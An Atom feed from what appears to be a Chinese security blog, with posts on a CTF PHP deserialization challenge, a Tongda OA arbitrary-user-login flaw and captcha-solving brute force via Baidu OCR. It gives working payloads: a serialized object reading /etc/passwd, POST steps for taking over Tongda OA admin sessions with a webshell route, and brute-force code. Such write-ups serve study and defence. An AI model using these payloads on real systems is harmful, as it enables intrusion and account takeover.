<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c1ay</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c1aysec.github.io/"/>
  <updated>2020-05-10T10:01:15.410Z</updated>
  <id>https://c1aysec.github.io/</id>
  
  <author>
    <name>c1ay</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020网鼎杯青龙组-php反序列化</title>
    <link href="https://c1aysec.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/</id>
    <published>2020-05-10T08:51:05.550Z</published>
    <updated>2020-05-10T10:01:15.410Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2020网鼎杯青龙组-php反序列化"><a href="#2020网鼎杯青龙组-php反序列化" class="headerlink" title="2020网鼎杯青龙组-php反序列化"></a>2020网鼎杯青龙组-php反序列化</h3><p>赛后拿到了题目的源码，搭到本地做了一遍，记录一下</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op;</div><div class="line">    <span class="keyword">protected</span> $filename;</div><div class="line">    <span class="keyword">protected</span> $content;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        $op = <span class="string">"1"</span>;</div><div class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</div><div class="line">        $content = <span class="string">"Hello World!"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();   </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;write();       </div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</div><div class="line">            $res = <span class="keyword">$this</span>-&gt;read();</div><div class="line">            <span class="keyword">$this</span>-&gt;output($res);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="keyword">$this</span>-&gt;content;</div><div class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</div><div class="line">                <span class="keyword">die</span>();</div><div class="line">            &#125;</div><div class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</div><div class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</div><div class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</div><div class="line">        $res = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</div><div class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $res;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> $s;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</div><div class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</div><div class="line"></div><div class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</div><div class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</div><div class="line">        $obj = unserialize($str);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>大致过了遍代码，看到这里存在php反序列化,有两条利用链，分别对应文件的读和写操作，具体分析如下：</p><p>首先传入序列化字符串str，反序列化时触发FileHandler类的<code>__destruct</code>方法，这里会对<code>$this-&gt;op</code>的值进行判断，当<code>$this-&gt;op===&quot;2&quot;</code>，会将<code>$this-&gt;op</code>重新赋值为<code>&quot;1&quot;</code>,并将<code>$this-&gt;content</code>赋为空字符串；之后进入<code>process</code>方法，当<code>$this-&gt;op==&quot;1&quot;</code>时，进入<code>write</code>方法，但是由于这里<code>$this-&gt;content</code>的值被赋为了空字符串，所以不能向文件写入任何可控内容，导致“写”这一条利用链不能利用，所以要想办法绕过<code>__destruct</code>当中的判断，进行读文件的利用，这里可以将<code>$this-&gt;op</code>的值设置为整型数字2进行绕过，在<code>__destruct</code>当中使用<code>===</code>进行了强比较，所以<code>2===&quot;2&quot;</code>结果为False，而在<code>process</code>方法中，使用了<code>==</code>进行比较，由于php弱类型，<code>2==&quot;2&quot;</code>结果为True，进入read函数进行任意文件读取</p><p>pop链构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到payload：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>直接将上述字符传入str并不能读取成功，这是因为序列化字符串当中protected属性的影响，三种属性对应的序列化字符串格式如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">private:数据类型:属性名长度:<span class="string">"\00类名\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">protected:数据类型:属性名长度:<span class="string">"\00*\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">public:数据类型:属性名长度:<span class="string">"属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div></pre></td></tr></table></figure><p>所以这里的payload实际上为：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;00*00op&quot;;i:2;s:11:&quot;00*00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S</p><p><code>\00</code>三个字符均符合<code>!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)</code>，所以这里读取成功<br><img src="http://pic.c1imber.top/blog/20200510/71LKiCfOBTXL.png?imageslim" alt="mark"></p><p>然后就可以通过任意文件读取获得flag了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;a href=&quot;#2020网鼎杯青龙组-php反序列化&quot; class=&quot;headerlink&quot; title=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;/a&gt;2020网鼎杯青龙组-php反序列化&lt;/h3&gt;&lt;p&gt;赛后拿到了题
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>记一次ctf出题记录</title>
    <link href="https://c1aysec.github.io/2020/04/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/04/26/记一次出题记录/</id>
    <published>2020-04-26T03:56:20.910Z</published>
    <updated>2020-04-26T03:57:19.278Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5a9d8c434e9059b199f2d8e1c6fc29635b9a2131020d48daecd6cbe474d142ac"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录</title>
    <link href="https://c1aysec.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/04/22/通达OA任意用户登录/</id>
    <published>2020-04-22T08:46:58.116Z</published>
    <updated>2020-04-24T09:40:29.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析文章：<a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" title="安恒信息应急响应中心" target="_blank" rel="external">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p><p>本地测试版本：2017、v11.3,这两个版本，奇怪的是，在这两个版本的源码当中，都没有找到分析文章当中对<code>CODE_LOGIN.$CODEUID</code>进行判断的那块代码</p><p><img src="http://pic.c1imber.top/blog/20200422/KAn7dkt3wP2e.png?imageslim" alt="mark"></p><p>漏洞位置：</p><p>logincheck_code.php<br><img src="http://pic.c1imber.top/blog/20200422/rwElnHfsQSR6.png?imageslim" alt="mark"></p><p>这里<code>$UID</code>可控，当<code>$_POST[&#39;UID&#39;]</code>为1时，会直接从数据库USER表查询查询系统管理员的信息，然后直接将结果直接赋值给<code>$_SESSION</code>变量，获取系统管理员登录权限（缺少对<code>CODE_LOGIN.$CODEUID</code>的判断,导致直接POST传入UID=1即可获取系统管理员登录权限）</p><p><img src="http://pic.c1imber.top/blog/20200422/Si49nYzoD0Wy.png?imageslim" alt="mark"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">xxx/logincheck_code.php</div><div class="line"></div><div class="line"><span class="symbol">POST:</span>UID=<span class="number">1</span></div><div class="line"></div><div class="line">之后访问xxx<span class="meta-keyword">/general/</span>index.php即可获取系统管理员权限</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200422/AHJdAEDlkH6Y.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/o8zdvzknmwjW.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/xbCnkhHk3VoW.png?imageslim" alt="mark"></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>访问xxx/logincheck_code.php，若返回<code>{&quot;status&quot;:1,&quot;msg&quot;:&quot;&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>的信息，基本可以确定存在漏洞<br><img src="http://pic.c1imber.top/blog/20200422/wfoUXXGfK0qe.png?imageslim" alt="mark"></p><p>影响范围还是挺大的，当进入后台后，可以在后台数据库管理的位置通过general_log获取网站的webshell</p><p>网站根目录的获取：系统管理-&gt;系统参数设置-&gt;OA服务设置</p><h3 id="2020-4-24补充"><a href="#2020-4-24补充" class="headerlink" title="2020.4.24补充"></a>2020.4.24补充</h3><p>终于下载到了通达OAv11.4版本：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe" title="下载链接" target="_blank" rel="external">下载链接</a></p><p>查看漏洞位置logincheck_code.php,对比之前分析的v11.3和2017版本，可以看到增加了对<code>CODE_LOGIN.$CODEUID</code>的判断:<br><img src="http://pic.c1imber.top/blog/20200424/uvUkptTOx2mB.png?imageslim" alt="mark"></p><p>当<code>$login_codeuid = TD::get_cache(&quot;CODE_LOGIN&quot; . $CODEUID);</code>不存在或者为空时，会输出<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;参数错误&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>并退出程序，所以这里如果想登录，除了需要POST传入UID=1以外，还需要传入<code>CODEUID</code></p><p>全局查找<code>CODE_LOGIN</code>，在general/login_code.php当中，程序通过<code>$login_codeuid = getUniqid();</code>生成了<code>CODE_LOGIN</code>存入了缓存并输出<br><img src="http://pic.c1imber.top/blog/20200424/d0LKr0OdhY3L.png?imageslim" alt="mark"></p><p>这里就可以通过直接访问general/login_code.php获取缓存当中的<code>CODE_LOGIN</code>,通过获取到的<code>CODE_LOGIN</code>绕过logincheck_code.php的判断，获取系统管理员的登录权限</p><h3 id="v11-4版本漏洞检测及利用"><a href="#v11-4版本漏洞检测及利用" class="headerlink" title="v11.4版本漏洞检测及利用"></a>v11.4版本漏洞检测及利用</h3><p>直接访问logincheck_code.php，如果返回<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;\u53c2\u6570\u9519\u8bef\uff01&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>,则说明有可能存在漏洞</p><p>请求/general/login_code.php,获取codeuid<br><img src="http://pic.c1imber.top/blog/20200424/769EytU6Glfn.png?imageslim" alt="mark"></p><p>访问logincheck_code.php，POST传入UID=1和CODEUID=获取到的codeuid,即可获取系统管理员的登录权限<br><img src="http://pic.c1imber.top/blog/20200424/FciVx00ABsob.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200424/C4tSEqmgvdDY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通达OA任意用户登录&quot;&gt;&lt;a href=&quot;#通达OA任意用户登录&quot; class=&quot;headerlink&quot; title=&quot;通达OA任意用户登录&quot;&gt;&lt;/a&gt;通达OA任意用户登录&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>暴力破解-百度api识别图形验证码学习记录</title>
    <link href="https://c1aysec.github.io/2020/03/11/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E7%99%BE%E5%BA%A6api%E8%AF%86%E5%88%AB%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/03/11/暴力破解-百度api识别图形验证码学习记录/</id>
    <published>2020-03-11T05:12:36.304Z</published>
    <updated>2020-03-31T04:40:21.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="暴力破解-百度api识别图形验证码学习记录"><a href="#暴力破解-百度api识别图形验证码学习记录" class="headerlink" title="暴力破解-百度api识别图形验证码学习记录"></a>暴力破解-百度api识别图形验证码学习记录</h1><p>目标登录口如下，通过登录返回信息的不同，已经确认用户名为admin：</p><p><img src="http://pic.c1imber.top/blog/20200311/wjoeIxY5iCGy.png?imageslim" alt="mark"></p><p>登录失败时，再次尝试会提示验证码错误，说明验证码在登录错误后失效了，经过测试确定验证码由JSESSIONID控制</p><p><img src="http://pic.c1imber.top/blog/20200311/rFfYL4NU3KUE.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200311/om44GFm2H65M.png?imageslim" alt="mark"><br>但是可以看到这里的验证码属于比较简单的验证码，应该可以很容易的识别出来</p><p>尝试使用pytesseract，但是由于验证码有噪点和干扰线等因素，导致识别率不高，这里可以通过训练去提高识别率，但是前几天刚好看了一篇通过百度api识别图形验证码的文章，于是打算尝试一下，使用的是<a href="https://ai.baidu.com/tech/ocr/general" title="通用文字识别" target="_blank" rel="external">通用文字识别</a></p><p><img src="http://pic.c1imber.top/blog/20200311/pC7GMucDzRD8.png?imageslim" alt="mark"></p><p><strong>接口描述（官方）：</strong></p><p>基于业界领先的深度学习技术，提供多场景、多语种、高精度的整图文字检测和识别服务，多项ICDAR指标居世界第一</p><p><strong>使用方法：</strong><br><a href="https://cloud.baidu.com/doc/OCR/s/zk3h7xz52" title="官方文档" target="_blank" rel="external"><br>官方文档</a></p><p><strong>请求URL：</strong> <code>https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic</code></p><p><strong>请求参数：</strong>access_token、image(图像数据，base64编码后进行urlencode，要求base64编码和urlencode后大小不超过4M，最短边至少15px，最长边最大4096px,支持jjpg/jpeg/png/bmp格式，当image字段存在时url字段失效)</p><p><strong>请求header：</strong></p><p><code>Content-Type:application/x-www-form-urlencoded</code></p><p><strong>返回参数：</strong></p><p>返回数据格式为json，格式大致如下：</p><pre><code>{&apos;log_id&apos;:xxx, u&apos;words_result_num&apos;: x, &apos;words_result&apos;: [{&apos;words&apos;: &apos;结果&apos;}]}</code></pre><p>其中words的键值为识别结果</p><p><strong>python识别代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">baidu_api</span><span class="params">(access_token,image_b64)</span>:</span></div><div class="line">   api_url=<span class="string">'https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic'</span></div><div class="line">   api_headers = &#123;</div><div class="line">       <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></div><div class="line">   &#125;</div><div class="line">   api_body = &#123;</div><div class="line">       <span class="string">'access_token'</span>:<span class="string">'%s'</span>%(access_token),</div><div class="line">       <span class="string">'language_type'</span>: <span class="string">'ENG'</span></div><div class="line">   &#125;    </div><div class="line">   api_body[<span class="string">'image'</span>]=image_b64</div><div class="line">   res=requests.post(api_url,headers=api_headers,data=api_body,verify=<span class="keyword">False</span>).json()</div><div class="line">   <span class="keyword">if</span> len(res[<span class="string">'words_result'</span>])==<span class="number">0</span>:</div><div class="line">       <span class="keyword">print</span> <span class="string">'Recognition fails'</span></div><div class="line">   code=res[<span class="string">'words_result'</span>][<span class="number">0</span>][<span class="string">'words'</span>]</div><div class="line">   <span class="keyword">print</span> <span class="string">u"识别验证码为&#123;&#125;"</span>.format(code)</div><div class="line">   <span class="keyword">return</span> hashlib.md5(code).hexdigest().upper()</div></pre></td></tr></table></figure><p>(因为目标网站发送的验证码是经过MD5过的值，所以这里返回的是验证码的MD5)</p><p><strong>access_token获取：</strong></p><p>请求URL数据格式</p><p>向授权服务地址<code>https://aip.baidubce.com/oauth/2.0/token</code>发送请求（推荐使用POST），并在URL中带上以下参数：</p><pre><code>grant_type： 必须参数，固定为client_credentialsclient_id： 必须参数，应用的API Keyclient_secret： 必须参数，应用的Secret Key</code></pre><p><img src="http://pic.c1imber.top/blog/20200311/OhJa1fAb8qfq.png?imageslim" alt="mark"></p><p><strong>python代码如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#获取access_token</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_access_token</span><span class="params">()</span>:</span></div><div class="line">   oauth_url=<span class="string">"https://aip.baidubce.com/oauth/2.0/token"</span></div><div class="line">   API_Key=<span class="string">"xxx"</span></div><div class="line">   Secret_Key=<span class="string">"xxx"</span></div><div class="line">   oauth_data=<span class="string">"grant_type=client_credentials&amp;client_id=&#123;&#125;&amp;client_secret=&#123;&#125;"</span>.format(API_Key,Secret_Key)</div><div class="line">   access_token=requests.post(url=oauth_url,data=oauth_data).json()[<span class="string">"access_token"</span>]</div><div class="line">   <span class="keyword">return</span> access_token</div></pre></td></tr></table></figure><p>大致了解了api怎么用之后，开始尝试编写爆破脚本：</p><p><strong>图形验证码请求接口</strong></p><p><code>http://xxxxx/xxxCode.do</code></p><p>返回的数据如下：</p><p><img src="http://pic.c1imber.top/blog/20200311/tHtmS8lpH7N4.png?imageslim" alt="mark"></p><p>直接返回的就是base64编码的图片内容，免去了转码的操作，但是直接将这串base64当中image参数传入识别接口时，出现了下面的错误</p><p><img src="http://pic.c1imber.top/blog/20200311/QYW1S9su0PpG.png?imageslim" alt="mark"></p><p><code>{u&#39;log_id&#39;: 1943290521421654539L, u&#39;error_code&#39;: 216201, u&#39;error_msg&#39;: u&#39;image format error&#39;}</code></p><p>通过查看官方文档可以看到这是一个图片格式不支持识别的错误，因为目前该api只支持PNG、JPG、JPEG、BMP这几个格式,而目标图片的格式为jfif格式，这里需要对图片进行转码处理，可以使用PIL去实现，</p><p><img src="http://pic.c1imber.top/blog/20200311/oUKvy0L12kyk.png?imageslim" alt="mark"></p><p>另外，在图片转码之后依旧会出现错误，这是因为requests库在获取页面内容时，会将内容当中的回车换行符自动转义(\r\n-&gt;\r\n),虽然说在页面看到的还是\r\n，但是其实\r\n已经被转义成普通字符了</p><p><img src="http://pic.c1imber.top/blog/20200311/T9QqabpvENUl.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200311/yvobgjFkcWEQ.png?imageslim" alt="mark"></p><p>所以这里还要将requests获取内容当中的<code>\\r\\n</code>替换为<code>\r\n</code></p><p><strong>处理验证码python代码如下，返回处理后图片的base64</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#获取图形验证码并处理，返回处理过后的图片base64</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vcode</span><span class="params">()</span>:</span></div><div class="line">   vcode_url=<span class="string">"http://xxxxCode.do"</span></div><div class="line">   target_headers=&#123;</div><div class="line">   <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'</span>,</div><div class="line">   <span class="string">'Cookie'</span>: <span class="string">'JSESSIONID=00185B5D07CC30A0CEA2D9A1B40B4686'</span></div><div class="line">   &#125;</div><div class="line">   <span class="comment">#获取图形验证码保存，图片格式为jfif</span></div><div class="line">   image = requests.get(url=vcode_url,headers=target_headers).content.strip(<span class="string">'"'</span>)</div><div class="line">   f=open(<span class="string">r"C:\Users\win7x64\Desktop\test.jpeg"</span>,<span class="string">"wb"</span>)</div><div class="line">   f.write(base64.b64decode(image.replace(<span class="string">"\\r\\n"</span>,<span class="string">"\r\n"</span>)))</div><div class="line">   f.close()</div><div class="line">   <span class="comment">#将图片转为百度api可以识别的格式jpeg</span></div><div class="line">   img = Image.open(<span class="string">r'C:\Users\win7x64\Desktop\test.jpeg'</span>)</div><div class="line">   img.save(<span class="string">r'C:\Users\win7x64\Desktop\test1.jpeg'</span>,<span class="string">"jpeg"</span>)</div><div class="line">   f=open(<span class="string">r"C:\Users\win7x64\Desktop\test1.jpeg"</span>,<span class="string">'rb'</span>)</div><div class="line">   image_b64=base64.b64encode(f.read())</div><div class="line">   f.close()</div><div class="line">   <span class="keyword">return</span> image_b64</div></pre></td></tr></table></figure><p>之后就可以通过识别的验证码带入登录接口当中暴力破解了了，效果如下，但是目前还没有爆破成功….</p><p><img src="http://pic.c1imber.top/blog/20200311/4kB2pFkJlVIN.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
